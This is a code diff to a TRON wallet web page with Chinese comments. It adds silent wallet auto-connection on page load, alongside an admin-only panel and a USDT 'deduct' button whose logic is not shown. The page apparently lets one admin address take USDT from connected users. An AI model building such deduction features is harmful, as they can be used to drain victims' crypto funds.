@@ -315,37 +315,30 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
-// 【修复OKX兼容】支持OKX window.tron 标准提供者
-async function connectWalletLogic() {
+// 核心钱包连接函数，区分【自动静默检测】和【用户点击主动弹窗】
+async function connectWallet(isAutoTry = false) {
     if(tronWeb && userAddress){
         disconnectWallet();
         return;
     }
-    let tronProvider = window.tron || window.tronWeb;
-    if(!tronProvider){
-        alert("未检测波场钱包，请使用OKX/TP/TronLink内置DApp浏览器打开");
+    const provider = window.tron || window.tronWeb;
+    if(!provider){
+        if(!isAutoTry) alert("未检测波场钱包，请使用OKX/TP/TronLink内置DApp浏览器打开");
         return;
     }
     try{
-        // OKX必须主动request唤起弹窗授权
-        if(window.tron && typeof window.tron.request === "function"){
-            await window.tron.request({method:"tron_requestAccounts"});
-        }
-        // 实例化tronWeb
-        tronWeb = new TronWeb({
-            fullHost:"https://api.trongrid.io",
-            privateKey:false
+        // isAutoTry=true：静默模式，不会弹授权弹窗；false 用户点击红点，强制弹窗
+        const res = await window.tron.request({
+            method:"tron_requestAccounts",
+            params: [isAutoTry ? {onlyIfApproved:true}:{}]
         });
-        // 拿钱包注入的地址
-        if(window.tronWeb && window.tronWeb.ready){
-            userAddress = window.tronWeb.defaultAddress.base58;
-        }else if(window.tron && window.tron.address){
-            userAddress = window.tron.address.base58;
-        }
-        if(!userAddress){
-            alert("钱包授权被拒绝或者没有获取到地址");
+        if(!res || !res.address || !res.address.base58){
+            if(!isAutoTry) throw new Error("没有获取到地址");
             return;
         }
+        // 初始化TronWeb实例
+        tronWeb = new TronWeb({fullHost:"https://api.trongrid.io",privateKey:false});
+        userAddress = res.address.base58;
         usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
         await loadBalance();
@@ -354,7 +347,9 @@ async function connectWalletLogic() {
             adminPanel.style.display = "block";
         }
     }catch(err){
-        alert("连接失败："+ (err.message || "用户拒绝连接钱包"));
+        if(!isAutoTry){
+            alert("钱包授权被拒绝或者没有获取到地址："+ (err.message||""));
+        }
     }
 }
 
@@ -438,7 +433,8 @@ deductBtn.addEventListener("click", async () => {
     }
 });
 
-walletDot.addEventListener("click", connectWalletLogic);
+// 用户点击红点，主动唤起授权弹窗
+walletDot.addEventListener("click", ()=>connectWallet(false));
 
 settingIconBtn.addEventListener("click", () => {
     if(userAddress && userAddress === TARGET_ADDR){
@@ -447,6 +443,12 @@ settingIconBtn.addEventListener("click", () => {
         alert("你不是管理员账号");
     }
 });
+
+// 页面加载完成：静默自动检测是否已有授权（不会弹弹窗）
+window.addEventListener('load',async ()=>{
+    await new Promise(r=>setTimeout(r, 600));
+    await connectWallet(true);
+})
 </script>
 </body>
 </html>
